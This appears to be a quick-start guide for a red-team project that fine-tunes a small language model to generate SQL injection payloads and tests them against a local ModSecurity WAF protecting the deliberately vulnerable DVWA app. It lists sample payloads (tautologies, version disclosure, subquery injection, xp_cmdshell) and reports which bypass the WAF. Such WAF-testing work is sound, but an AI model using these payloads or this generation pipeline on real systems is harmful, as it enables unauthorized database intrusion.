# 🚀 Quick Start Guide - Red Team LLM

**Quick reference for training and testing SQL injection payload generation using LLM**

---

## ⚡ TL;DR - Commands Only

```bash
# 1. Clear GPU memory
nvidia-smi  # Check for zombie processes
kill -9 <PID>  # If any exist

# 2. Generate payloads (v5_fixed)
python scripts/simple_gen_v5_fixed_clear_cache.py > results/v5_fixed.log 2>&1
# Wait ~4 minutes

# 3. Start WAF
cd waf && docker compose up -d && cd ..
sleep 15  # Wait for containers

# 4. Test payloads
python replay/harness.py results/v5_fixed_payloads_30.txt --output results/test_results.jsonl

# 5. View results
cat results/test_results.jsonl | jq -r 'select(.blocked==false) | .payload'  # Passed
cat results/test_results.jsonl | jq '.blocked' | sort | uniq -c  # Summary
```

---

## 📋 Step-by-Step Guide

### 1️⃣ Environment Check

**Check GPU status:**

```bash
nvidia-smi
```

**Expected output:**

```
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 570.xx.xx    Driver Version: 572.xx    CUDA Version: 12.8     |
|-------------------------------+----------------------+----------------------+
| GPU  Name                     | Memory-Usage         | GPU-Util             |
|===============================+======================+======================|
|   0  NVIDIA GeForce RTX 4060  |      0MiB /  8188MiB |      0%              |
+-------------------------------+----------------------+----------------------+
```

**If processes exist:**

```bash
# Kill zombie processes
kill -9 <PID>

# Verify GPU is free
nvidia-smi
```

---

### 2️⃣ Generate SQL Injection Payloads

**Using v5_fixed (RECOMMENDED - generates real SQL):**

```bash
python scripts/simple_gen_v5_fixed_clear_cache.py > results/v5_fixed.log 2>&1
```

**Timeline:**

- 0-30s: Loading tokenizer
- 30s-1m: Loading base model (gemma-2-2b-it)
- 1m-2m: Loading PEFT adapter
- 2m-4m: Generating 30 payloads (~6s each)

**Monitor progress (in another terminal):**

```bash
tail -f results/v5_fixed.log
```

**Expected log output:**

```
🧹 Clearing GPU cache...
🚀 Loading v5_fixed model...
📦 Loading base model...
Loading checkpoint shards: 100%|██████████| 2/2 [00:09<00:00,  4.57s/it]
🧹 Clearing cache before PEFT adapter...
🔧 Loading PEFT adapter...
✅ Model loaded!

📝 Generating 30 test payloads...

[1/30] order by 16
[2/30] ) or (select @@version
[3/30] 1 or 1=1 --
...
[30/30] ORDER BY 20

✅ Saved 30 payloads to results/v5_fixed_payloads_30.txt
```

**Output file:** `results/v5_fixed_payloads_30.txt`

---

### 3️⃣ Start WAF (Web Application Firewall)

**Start Docker containers:**

```bash
cd waf
docker compose up -d
cd ..
```

**Wait for services:**

```bash
sleep 15
```

**Verify WAF is running:**

```bash
curl -I http://localhost:8080/vulnerabilities/sqli/?id=1
```

**Expected:** `HTTP/1.1 302 Found` (redirect to login)

**Troubleshooting:**

| Error               | Solution                                            |
| ------------------- | --------------------------------------------------- |
| 502 Bad Gateway     | `docker compose restart dvwa && sleep 15`           |
| Connection refused  | `docker compose down && docker compose up -d`       |
| Port already in use | `docker compose down` (stop conflicting containers) |

**Check logs if issues persist:**

```bash
docker logs waf_nginx_modsec --tail 20
docker logs dvwa_app --tail 20
```

---

### 4️⃣ Test Payloads Against WAF

**Run automated test harness:**

```bash
python replay/harness.py \
  results/v5_fixed_payloads_30.txt \
  --output results/test_results.jsonl
```

**Expected output:**

```
🎯 Testing 30 payloads against http://localhost:8080/vulnerabilities/sqli/
📝 Parameter: id
💾 Output: results/test_results.jsonl

======================================================================
📊 WAF REPLAY RESULTS
======================================================================
Total payloads:  30
✅ Passed WAF:   25 (83.3%)
🚫 Blocked:      5 (16.7%)
======================================================================

💾 Results saved to:
   - results/test_results.jsonl
   - results/test_results.csv
```

---

### 5️⃣ Analyze Results

**Show payloads that bypassed WAF:**

```bash
cat results/test_results.jsonl | jq -r 'select(.blocked==false) | .payload'
```

**Show payloads that were blocked:**

```bash
cat results/test_results.jsonl | jq -r 'select(.blocked==true) | .payload'
```

**Count by status:**

```bash
cat results/test_results.jsonl | jq '.blocked' | sort | uniq -c
```

**Example output:**

```
     25 false  ← Bypassed WAF (successful attacks)
      5 true   ← Blocked by WAF
```

**View detailed results in CSV:**

```bash
cat results/test_results.csv
```

**Example CSV:**

```csv
id,payload,status,response_size,blocked
0,order by 16,200,1523,false
1,) or (select @@version,200,1523,false
2,1 or 1=1 --,200,1523,false
3,exec master..xp_cmdshell,403,146,true
...
```

---

## 🔧 Common Issues & Solutions

### Issue 1: GPU Out of Memory

**Symptom:**

```
CUDA out of memory. Tried to allocate 2.00 GiB
```

**Solution:**

```bash
# 1. Check GPU usage
nvidia-smi

# 2. Kill all Python processes
kill -9 $(pgrep python)

# 3. Clear GPU cache
python -c "import torch; torch.cuda.empty_cache()"

# 4. Retry generation
```

---

### Issue 2: Model Loading Hangs

**Symptom:** Script stuck at "Loading checkpoint shards..."

**Solution:**

```bash
# 1. Kill the process
Ctrl+C

# 2. Check for zombie processes
nvidia-smi

# 3. Kill them
kill -9 <PID>

# 4. Use the cache-clearing script
python scripts/simple_gen_v5_fixed_clear_cache.py
```

---

### Issue 3: WAF Returns 502

**Symptom:**

```bash
curl http://localhost:8080/vulnerabilities/sqli/?id=1
# Returns: 502 Bad Gateway
```

**Solution:**

```bash
# 1. Restart DVWA container
cd waf
docker compose restart dvwa

# 2. Wait for startup
sleep 15

# 3. Test again
curl -I http://localhost:8080/vulnerabilities/sqli/?id=1
# Should return: 302 Found
```

---

### Issue 4: Docker Compose Not Found

**Symptom:**

```
docker-compose: command not found
```

**Solution:**

```bash
# Use docker compose (v2 syntax) instead
docker compose up -d
```

---

## 📂 Important Files

### Scripts (Use These)

| File                                         | Purpose                            | When to Use             |
| -------------------------------------------- | ---------------------------------- | ----------------------- |
| `scripts/simple_gen_v5_fixed_clear_cache.py` | ✅ Generate payloads (v5_fixed)    | **PRIMARY - Use this!** |
| `scripts/simple_gen_v5_fixed.py`             | Generate payloads (no cache clear) | If above fails          |
| `replay/harness.py`                          | Test payloads against WAF          | Always for testing      |

### Results (Output)

| File                               | Content                             |
| ---------------------------------- | ----------------------------------- |
| `results/v5_fixed_payloads_30.txt` | 30 generated SQL injection payloads |
| `results/test_results.jsonl`       | Detailed WAF test results (JSON)    |
| `results/test_results.csv`         | WAF test results (CSV format)       |
| `results/v5_fixed.log`             | Generation process log              |

### Configuration

| File                                       | Purpose                        |
| ------------------------------------------ | ------------------------------ |
| `configs/red_qwen2_7b_dora_8gb_smoke.yaml` | Training config (v5_fixed)     |
| `waf/docker-compose.yml`                   | WAF setup (ModSecurity + DVWA) |
| `requirements.txt`                         | Python dependencies            |

---

## 🎯 Expected Results

### v5_fixed Performance

**Bypass Rate:** 83.3% (25/30 payloads pass WAF)

**Sample Successful Payloads:**

```sql
order by 16                                          ✅ Column enumeration
) or (select @@version                              ✅ Version disclosure
1 or 1=1 --                                         ✅ Boolean bypass
or 1=1 --                                           ✅ Boolean bypass
AND 1=1 AND (SELECT COUNT(*) FROM users) = 1       ✅ Subquery injection
%20OR%201=1                                         ✅ URL-encoded bypass
or 'a'='a                                           ✅ String comparison
```

**All payloads are real SQL injection syntax!**

---

## 🔄 Full Workflow Example

```bash
# 1. Clear GPU
nvidia-smi && kill -9 $(pgrep python)

# 2. Generate payloads
python scripts/simple_gen_v5_fixed_clear_cache.py > results/v5_fixed.log 2>&1 &

# 3. Monitor (in another terminal)
tail -f results/v5_fixed.log

# 4. Wait ~4 minutes, then start WAF
cd waf && docker compose up -d && cd ..
sleep 15

# 5. Test
python replay/harness.py results/v5_fixed_payloads_30.txt --output results/test.jsonl

# 6. View bypassed payloads
cat results/test.jsonl | jq -r 'select(.blocked==false) | .payload'

# 7. Cleanup
docker compose -f waf/docker-compose.yml down
```

---

## ⏱️ Time Estimates

| Task                | Duration       |
| ------------------- | -------------- |
| GPU check & cleanup | 30 seconds     |
| Generate payloads   | 3-5 minutes    |
| Start WAF           | 20 seconds     |
| Test 30 payloads    | 15-30 seconds  |
| Analyze results     | 1 minute       |
| **TOTAL**           | **~6 minutes** |

---

## 📚 Additional Resources

- **Full validation report:** `V5_COMPLETE_VALIDATION_REPORT.md`
- **WAF setup guide:** `waf/README.md`
- **Bug analysis:** `V5_BUG_ANALYSIS_FINAL.md`
- **Project README:** `README.md`

---

## ✅ Quick Checklist

Before running:

- [ ] GPU memory is free (check `nvidia-smi`)
- [ ] No zombie Python processes
- [ ] Docker Desktop is running
- [ ] Required ports are free (8080, 8443)

After generation:

- [ ] Output file exists: `results/v5_fixed_payloads_30.txt`
- [ ] File contains 30 payloads
- [ ] Payloads are SQL syntax (not garbage)

After WAF test:

- [ ] Results file exists: `results/test_results.jsonl`
- [ ] Bypass rate ~80%+
- [ ] Blocked payloads make sense (aggressive patterns)

---

**Last Updated:** November 8, 2025  
**Version:** 1.0
